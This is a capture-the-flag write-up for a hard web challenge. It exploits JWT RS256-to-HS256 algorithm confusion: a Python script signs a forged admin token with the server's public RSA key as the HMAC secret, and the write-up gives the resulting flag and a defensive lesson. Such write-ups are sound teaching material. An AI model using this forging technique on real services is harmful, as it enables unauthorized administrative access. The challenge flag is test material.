# Delegated Signature

**Challenge title:** Signature Déléguée\
**Category:** Web\
**Difficulty:** Hard\
**Points:** 175\
**Author:** Perceval

## Target

- URL: https://signature-deleguee.cyberzerk.fr
- `GET /login`: obtain a JWT
- `GET /pubkey`: retrieve the RSA public key
- `GET /admin`: access the administrator area using a Bearer token

## Solution

### Step 1: Inspect the login token

Request `/login` and extract the JWT from the JSON response:

```python
import requests
import jwt

BASE = "https://signature-deleguee.cyberzerk.fr"

response = requests.get(f"{BASE}/login")
token = response.json()["token"]

print(jwt.get_unverified_header(token))
print(jwt.decode(token, options={"verify_signature": False}))
```

The token header specified `RS256`, and its payload contained:

```json
{
  "user": "marc_v",
  "role": "user"
}
```

Using the original token at `/admin` returned HTTP 403, indicating that the token was accepted but the account did not have the administrator role.

### Step 2: Identify the algorithm-confusion weakness

The public RSA key was available at `/pubkey`. The server accepted RS256 tokens but did not properly restrict the verification algorithm.

The vulnerability was an RS256-to-HS256 algorithm confusion: the exposed RSA public key could be reused as the HMAC-SHA256 signing secret if supplied in its exact SubjectPublicKeyInfo PEM representation.

### Step 3: Forge an administrator token

The following Python script retrieves the public key, constructs an HS256 token with the administrator role, signs it using the public PEM bytes, and requests `/admin`.

```python
import requests
import json
import base64
import hmac
import hashlib

BASE = "https://signature-deleguee.cyberzerk.fr"

public_pem = requests.get(f"{BASE}/pubkey").content

def b64(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"user": "marc_v", "role": "admin"}

message = (
    b64(json.dumps(header, separators=(",", ":")).encode())
    + "."
    + b64(json.dumps(payload, separators=(",", ":")).encode())
)

signature = hmac.new(
    public_pem,
    message.encode(),
    hashlib.sha256
).digest()

forged_token = message + "." + b64(signature)

response = requests.get(
    f"{BASE}/admin",
    headers={"Authorization": f"Bearer {forged_token}"}
)

print("HTTP:", response.status_code)
print(response.text)
```

The server returned HTTP 200 and the administrator welcome message with the flag.

## Flag

```text
CyberZerk{JWT_c0nfus10n_RS256_v3rs_HS256_cl3_publ1qu3}
```

## Security Lesson

JWT verification must enforce an explicit algorithm allowlist. An RSA public key must never be accepted as an HMAC secret. The verifier should bind each key to its intended algorithm and key type, rather than trusting the token's `alg` header to choose the verification method.
